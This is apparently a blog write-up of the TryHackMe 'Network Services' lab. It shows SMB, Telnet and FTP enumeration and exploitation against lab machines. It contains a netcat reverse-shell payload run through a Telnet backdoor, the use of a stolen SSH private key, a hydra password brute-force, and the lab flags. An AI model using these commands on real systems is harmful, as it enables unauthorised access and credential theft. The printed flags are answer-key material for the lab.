---
layout: post
title:  "Network Services | Try Hack Me"
date:   2021-06-22 10:30:00 +0800
categories: Res THM
---

# Network Services

## Task 2 - Understanding SMB

Server Message Block Protocol - is a client-server communication protocol for sharing access to files, printers, serial ports and other resoureces on a network. Samba is unix  open source server that supports smb.

### What does SMB stand for?    
Server Message Block

### What type of protocol is SMB?    
response-request

### What do clients connect to servers using?    
tcp/ip

### What systems does Samba run on?
Unix


## Task 3 - Enumerating SMB

### Conduct an nmap scan of your choosing, How many ports are open?
Did the following: `nmap 10.10.97.189`

Gave 3: 22, 139, 445

### What ports is SMB running on?
Did the following `sudo nmap -sV -p 22,139,445 10.10.97.189`

So answer is 139/445
```
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

### Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    
Did `enum4linux 10.10.97.189` and found a following line:

So answer was WORKGROUP
```
[+] Got domain/workgroup name: WORKGROUP
```

### What comes up as the name of the machine?        
From the same output as before also gave this

So answer is 'POLOSMB'
```
[+] Got OS info for 10.10.97.189 from srvinfo:
	POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)

```

### What operating system version is running?    
Same output as before:

So answer is '6.1'
```
os version      :	6.1
```

### What share sticks out as something we might want to investigate?  
Using same output again:

'profiles' looks like it could be interesting...
```
Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      Network Logon Service
	profiles        Disk      Users profiles
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))

```


## Task 4 - Exploiting SMB

### What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
`smbclient //10.10.10.2/secret -U suit -p 139`

### Does the share allow anonymous access? Y/N?
Did the following `smbclient //10.10.97.189/profiles` and skipped password.

Now did `ls`... Seems to work, so 'Y'

### Who can we assume this profile folder belongs to?
After doing `ls` before found an interesting file...

Did the following to get it: `get "Working From Home Information.txt"`

Within this:
```
John Cactus,

As you're well aware, 
```

Looks like a message directed to this person 'John Cactus'

### What service has been configured to allow him to work from home?
Within this message it looks like 'ssh'

```
As such- your account has now been enabled with ssh
access to the main server.
```

### Okay! Now we know this, what directory on the share should we look in?
Have a look at '.ssh'

### Which of these keys is most useful to us?
Did `cd .ssh` to go inside of the directory, and then `ls` to find what's inside.

Found the 'id_rsa' file here

### What is the smb.txt flag?
Did `get "id_rsa"`, then `chmod 600 id_rsa` to be able to use it

Now tried a number of usernames but eventually got `ssh -i id_rsa cactus@10.10.97.189`

Did `ls` and found a file called 'smb.txt' which using `cat` got:
'THM{smb_is_fun_eh?}'


## Task 5 - Understanding Telnet 

### What is Telnet?    
Application Protocol

### What has slowly replaced Telnet?    
ssh

### How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
telnet 10.10.10.3 23

### The lack of what, means that all Telnet communication is in plaintext?
encryption


## Task 6 - Enumerating Telnet

### How many ports are open on the target machine?    
Did `nmap -T4 -p- 10.10.211.216`
And found one open.

### What port is this?
8012

### This port is unassigned, but still lists the protocol it's using, what protocol is this?     
It is using 'tcp'

### Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
0

### Based on the title returned to us, what do we think this port could be used for?
Did `telnet 10.10.211.216 8012`.

'SKIDY'S BACKDOOR' suggests it could be used for 'a backdoor'

### Who could it belong to? Gathering possible usernames is an important step in enumeration.
'Skidy'


## Task 7 - Exploiting telnet

### Great! It's an open telnet connection! What welcome message do we receive?
`SKIDY'S BACKDOOR.`

### Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
N

### Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings?
Did `sudo tcpdump ip proto \\icmp -i tun0` on my kali machine.

Then did `.RUN ping 10.4.38.142 -c 1` on the vulnerable machine.

### What word does the generated payload start with?
Did `msfvenom -p cmd/unix/reverse_netcat lhost=10.4.38.142 port=4444 R`

This gave us `mkfifo /tmp/akjrjt; nc 10.4.38.142 4444 0</tmp/akjrjt | /bin/sh >/tmp/akjrjt 2>&1; rm /tmp/akjrjt`

So the starting word is 'mkfifo'

### What would the command look like for the listening port we selected in our payload?
`nc -lvp 4444`

### Success! What is the contents of flag.txt?
Did `.RUN mkfifo /tmp/akjrjt; nc 10.4.38.142 4444 0</tmp/akjrjt | /bin/sh >/tmp/akjrjt 2>&1; rm /tmp/akjrjt` and it worked.

Did `cat flag.txt` and got 'THM{y0u_g0t_th3_t3ln3t_fl4g}''


## Task 8 - Undertsanding FTP

### What communications model does FTP use?
client-server

### What's the standard FTP port?
21

### How many modes of FTP connection are there?   
2: active and passive


## Task 9 - Enumerating FTP

### How many ports are open on the target machine? 
2, Got from `nmap -T4 -p- 10.10.48.202`

### What port is ftp running on?
21

### What variant of FTP is running on it?  
Using `nmap -sV -p 21 10.10.48.202 ` found `vsftpd`

### What is the name of the file in the anonymous FTP directory?
Did `ftp 10.10.48.202`, entered 'anonymous' and skipped password.

Did `ls` and found 'PUBLIC_NOTICE.txt'

### What do we think a possible username could be?
Found 'mike' in the file.


## Task 10 - Exploiting FTP

### What is the password for the user "mike"?
`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.48.202 ftp`

Got this message `[21][ftp] host: 10.10.48.202   login: mike   password: password`

so 'password'

had to `gunzip rockyou.txt.gz` for this to work.

### What is ftp.txt?

Did `get ftp.txt` after logging in.
got 'THM{y0u_g0t_th3_ftp_fl4g}'